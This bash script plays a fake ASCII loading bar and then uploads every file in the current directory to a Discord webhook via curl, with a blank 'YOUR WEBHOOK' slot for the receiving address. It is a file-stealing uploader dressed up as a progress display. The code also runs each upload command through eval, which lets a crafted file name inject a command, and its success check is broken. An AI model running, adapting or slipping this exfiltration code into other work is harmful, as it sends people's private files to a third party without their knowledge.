#!/bin/bash

print_ascii_animation() {
    local ascii_art=("$@")
    local size=${#ascii_art[@]}
    local iterations=$1
    local delay=$2

    for ((i=0; i<$iterations; i++)); do
        for ((j=0; j<$size; j++)); do
            echo -ne "${ascii_art[j]}"
            usleep $(echo "$delay * 1000000" | bc)
            echo -ne "\r"
        done
    done
    echo
}

send_to_discord() {
    local file_name=$1
    local webhook_url=$2

    message="FILE :\n\`\`\`$file_name\`\`\`\n"
    curl_command="curl -s -F file1=@\"$file_name\" \"$webhook_url\""
    curl_result=$(eval $curl_command)

    if [ $curl_result -eq 0 ]; then
        echo "SEND : $file_name"
    else
        echo "ERROR WEBHOOK : $file_name" >&2
    fi
}

traverse_directory() {
    local folder_path=$1
    local webhook_url=$2

    files=$(ls -p "$folder_path" | grep -v /)
    for file_name in $files; do
        file_path="$folder_path/$file_name"
        echo "SEND : $file_path"
        send_to_discord "$file_path" "$webhook_url"
    done
}

loading_animation=(
    "[--------]   0% "
    "[█-------]   10% "
    "[██------]   20% "
    "[███-----]   30% "
    "[████----]   40% "
    "[█████---]   50% "
    "[██████--]   60% "
    "[███████-]   70% "
    "[████████]   100% "
)

print_ascii_animation 1 0.1 "${loading_animation[@]}"

folder_path=$(pwd)
webhook_url="" # YOUR WEBHOOK
traverse_directory "$folder_path" "$webhook_url"
